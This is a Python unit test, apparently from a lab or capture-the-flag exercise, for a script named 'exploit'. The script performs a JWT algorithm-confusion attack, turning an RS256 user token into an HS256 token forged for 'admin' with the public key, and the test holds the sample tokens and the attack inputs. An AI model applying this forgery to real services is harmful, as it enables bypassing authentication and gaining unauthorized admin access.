#! /usr/bin/env python3

from unittest import mock
from io import StringIO
import unittest

import sys
sys.path.append('../')
import exploit

class TestShit(unittest.TestCase):
	
	@mock.patch('sys.stdout', new_callable = StringIO)
	def test_exploit_run(self, mock_stdout):
		user_input = [
				'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InVzZXIifQ.RKVu9UEbdAaEi8EVph4c9lDZjLtkxDKts57kdaqZwd76GtRaT2tuxJBkid8wyofh-u23zgasO1ei1_beMBufseH5XE6P8nCk-IDsjiTOthF2DPOEoiNlf30HmWEcRdnxAjCTfRWAWoALBfNFutVbO0PP9vRmu9tNDrExd8x5erP-QnDfdEIQIi763FiLqwP5nVqKjlBZkNuEdiZxyCkgcLg-WZtQkGlf6G78n4U8T6qGnHXxRZxuuMcEEYnbf5iHPNKqys-t4hvc1h3vAWH_qxPSuzRKg_mucmY7jEYCnIK5MU_jCg12-LPYOk91e8_HjY4bvJmpm2lSQvHqQdJoYw',
				'ascii',
				'alg',
				'HS256',
				'login',
				'admin',
				'public.pem',
			]

		expected_jwt = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.FSfvCBAwypJ4abF6jFLmR7JgZhkW674Z8dIdAIRyt1E'

		with mock.patch('builtins.input', side_effect = user_input):
			exploit.run()

		result = mock_stdout.getvalue()
		assert expected_jwt in result, 'The result does not contain the expected JWT'
